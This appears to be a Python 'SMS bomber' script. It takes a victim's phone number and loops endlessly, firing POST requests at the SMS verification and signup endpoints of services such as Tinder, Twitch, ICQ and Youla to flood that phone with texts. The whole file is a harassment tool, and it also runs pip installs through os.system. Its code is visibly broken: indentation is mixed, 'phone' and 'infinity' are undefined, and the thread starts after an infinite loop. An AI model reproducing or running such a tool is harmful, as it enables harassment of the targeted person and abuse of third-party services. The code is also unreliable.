import requests, random
from time import sleep
from threading import Thread
import urllib.request
import colorama
import os
###################################
os.system('pip install requests') #
os.system('pip install colorama') #
###################################


colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']

_phone = input('[+] Enter Phone Number (+) : ')
countT = input('[+] Enter Threading : ')
_name = ''

for x in range(12):
	_name = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
	password = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
	username = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))

_phone9 = _phone[1:]

num = _phone
numplus = '+' + num
print(random.choice(colors))
while True:
                request_timeout = 0.00001
		_phone = phone
		_phone9 = _phone[1:]
		_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] 
		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] 
		_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
		_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

#1
    try:
        print(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus}))
    except:
        print("Failed.")
#2
    try:
        print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":numplus}))
    except:
        print("Failed.")
#3
    try:
        print(requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num)))
    except:
        print("Failed.")
#4
    try:
        print(requests.post('https://account.my.games/signup_send_sms/', data={'phone': _phone}))
    except:
        print("Failed.")
#5
    try:
        print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}))
    except:
        print("Failed.")
#6
    try:
        print(requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}))
    except:
        print("Failed.")
#7
    try:
        print(requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}))
    except:
        print("Failed.")
#8
    try:
        print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}))
    except:
        print("Failed.")
    print(random.choice(colors))

countT = Thread(target=infinity)
countT.start()
